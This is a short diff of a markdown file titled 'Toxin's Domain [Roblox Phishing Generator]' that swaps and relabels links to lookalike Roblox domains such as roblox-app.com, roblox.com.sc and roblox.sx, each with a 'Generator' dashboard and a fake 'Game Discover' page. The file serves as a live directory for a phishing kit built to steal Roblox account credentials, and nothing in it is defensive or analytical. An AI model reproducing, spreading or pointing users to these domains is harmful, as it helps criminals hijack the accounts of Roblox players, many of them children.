@@ -1,14 +1,14 @@
 ### Toxin's Domain [Roblox Phishing Generator]
 
-[Generator roblox.com.lv](https://roblox.com.lv/creates/dashboard)
+[Generator roblox-app.com](https://roblox-app.com/creates/TD/)
 
-[Game Discover](https://roblox.com.lv/discover)
+[Game Discover](https://roblox-app.com/discover)
 
 [Generator roblox.com.sc](https://roblox.com.sc/generate/dashboard)
 
 [Game Discover](https://roblox.com.sc/discover)
 
-[Generator roblox.com.sc](https://roblox.sx/creates/dashboard/)
+[Generator roblox.sx](https://roblox.sx/creates/dashboard/)
 
 [Game Discover](https://roblox.sx/discover)
 
